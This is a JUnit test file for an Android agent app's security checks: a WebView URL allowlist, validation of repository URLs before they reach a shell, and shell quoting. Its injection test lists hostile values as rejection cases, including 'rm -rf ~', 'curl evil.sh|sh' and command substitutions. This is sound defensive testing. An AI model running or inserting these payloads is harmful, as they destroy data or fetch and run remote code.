package com.pocket.agent;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import org.junit.Test;

/**
 * SecurityPolicy 的 JVM 单测：真实执行导航白名单、仓库地址校验、shell 转义。
 *
 * 这些断言对应的是「页面能调用 Termux 命令」这条链路上的三个闸门。
 * 以前只能靠人工读代码确认；现在 `gradlew testDebugUnitTest` 在 JVM 上跑，
 * 不依赖模拟器（本机无硬件虚拟化，AVD 起不来）。
 */
public class SecurityPolicyTest {

    // ---------- 1. WebView 导航白名单 ----------

    @Test
    public void trustedLoopbackHttp() {
        assertTrue(SecurityPolicy.isTrustedUrl("http://127.0.0.1:8787/"));
        assertTrue(SecurityPolicy.isTrustedUrl("http://localhost:8787/api/chat"));
        assertTrue(SecurityPolicy.isTrustedUrl("https://127.0.0.1/"));
    }

    @Test
    public void trustedAssetPages() {
        assertTrue(SecurityPolicy.isTrustedUrl("file:///android_asset/agentd_setup.html"));
        assertTrue(SecurityPolicy.isTrustedUrl("file:///android_asset/agentd_error.html"));
    }

    @Test
    public void rejectsExternalPages() {
        assertFalse(SecurityPolicy.isTrustedUrl("https://evil.com/"));
        assertFalse(SecurityPolicy.isTrustedUrl("http://192.168.1.1:8787/"));
        assertFalse(SecurityPolicy.isTrustedUrl("http://127.0.0.1.evil.com/"));
    }

    @Test
    public void rejectsDangerousSchemes() {
        assertFalse(SecurityPolicy.isTrustedUrl("javascript:alert(1)"));
        assertFalse(SecurityPolicy.isTrustedUrl("data:text/html,<script>x</script>"));
        assertFalse(SecurityPolicy.isTrustedUrl("content://com.android.contacts/data"));
        assertFalse(SecurityPolicy.isTrustedUrl("intent://scan/#Intent;scheme=zxing;end"));
    }

    @Test
    public void rejectsLocalFileOutsideAssets() {
        assertFalse(SecurityPolicy.isTrustedUrl("file:///sdcard/Download/x.html"));
        assertFalse(SecurityPolicy.isTrustedUrl("file:///data/data/com.pocket.agent/x.html"));
    }

    @Test
    public void rejectsAmbiguousUrls() {
        // 控制字符会被某些解析器截断，必须整体拒绝而非"取前缀通过"
        assertFalse(SecurityPolicy.isTrustedUrl("http://127.0.0.1\n.evil.com/"));
        assertFalse(SecurityPolicy.isTrustedUrl("http://127.0.0.1\t/"));
        assertFalse(SecurityPolicy.isTrustedUrl(" http://127.0.0.1/"));
        assertFalse(SecurityPolicy.isTrustedUrl(""));
        assertFalse(SecurityPolicy.isTrustedUrl(null));
    }

    // ---------- 2. 一键部署仓库地址 ----------

    @Test
    public void acceptsNormalRepoUrls() {
        assertTrue(SecurityPolicy.isSafeRepoUrl("https://github.com/X33834/pocketmind.git"));
        assertTrue(SecurityPolicy.isSafeRepoUrl("https://gitcode.com/badhope/pocketmind.git"));
        assertTrue(SecurityPolicy.isSafeRepoUrl(
                "http://127.0.0.1:8080/repo.git"));
    }

    @Test
    public void rejectsShellInjectionAttempts() {
        // 这些若拼进 shell 就能执行任意命令 —— 必须全部拒绝
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/a;rm -rf ~"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/a && curl evil.sh|sh"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/$(whoami)"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/`id`"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/' quoted"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/\"; id; \""));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/a\nrm -rf /"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://x/a>b"));
    }

    @Test
    public void rejectsNonHttpOrOversize() {
        assertFalse(SecurityPolicy.isSafeRepoUrl("git@github.com:x/y.git"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("ftp://x/y.git"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("file:///tmp/x"));
        assertFalse(SecurityPolicy.isSafeRepoUrl("https://" + "a".repeat(600)));
        assertFalse(SecurityPolicy.isSafeRepoUrl(null));
    }

    // ---------- 3. shell 转义 ----------

    @Test
    public void shellQuoteWrapsPlainString() {
        assertEquals("'https://x/y.git'", SecurityPolicy.shellQuote("https://x/y.git"));
    }

    @Test
    public void shellQuoteEscapesSingleQuote() {
        // 经典 POSIX 写法：'  →  '\''
        assertEquals("'a'\\''b'", SecurityPolicy.shellQuote("a'b"));
    }

    @Test
    public void shellQuoteHandlesNull() {
        assertEquals("''", SecurityPolicy.shellQuote(null));
    }
}
